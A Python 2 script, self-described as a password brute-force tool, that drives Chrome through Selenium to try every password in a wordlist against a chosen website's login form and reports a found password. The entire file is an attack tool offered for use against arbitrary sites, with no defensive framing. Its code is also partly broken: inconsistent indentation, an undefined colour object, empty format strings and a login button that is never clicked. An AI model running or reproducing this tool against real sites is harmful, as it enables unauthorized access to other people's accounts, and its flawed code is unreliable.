import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
parser = OptionParser()
now = datetime.datetime.now()
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()
CHROME_DVR_DIR = '/usr/bin/chromedriver'
def wizard():
    print("Password Brute Force Tool by @hameedibrh! Checkout my Github for more cool projects!")
    website = raw_input('enter website:')
    sys.stdout.write('checking'),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print ('PASS')
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print ('User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print ('[X]')
        t.sleep(1)
        print (' Website NOT FOUND')
        exit()

    username_selector = raw_input('username: ')
    password_selector = raw_input('password: ')
    login_btn_selector = raw_input('button: ')
    username = raw_input('userid: ')
    pass_list = raw_input('password list: ')
    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    driver = webdriver.Chrome(CHROME_DVR_DIR)
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1 #count
    browser = webdriver.Chrome(CHROME_DVR_DIR)
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector) 
                Sel_pas = browser.find_element_by_css_selector(password_selector)
                enter = browser.find_element_by_css_selector(login_btn_selector)        
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
		t.sleep(2)
		print ('password: '+ line + 'user: '+ username)
                temp = line 
		browser.switch_to_alert().accept()
        except KeyboardInterrupt: 
            exit()
	except selenium.common.exceptions.NoAlertPresentException:
            print 'AN ELEMENT HAS BEEN REMOVED '
            print 'LAST PASS ATTEMPT'
            print color.GREEN + 'Password found: '.format(temp)
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print 'AN ELEMENT HAS BEEN REMOVED'
            print 'LAST PASS ATTEMPT'
            print color.GREEN + 'Password found:'.format(temp)
            exit()
driver = webdriver.Chrome(CHROME_DVR_DIR)
optionss = webdriver.ChromeOptions()
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
count = 1 
if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()

username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
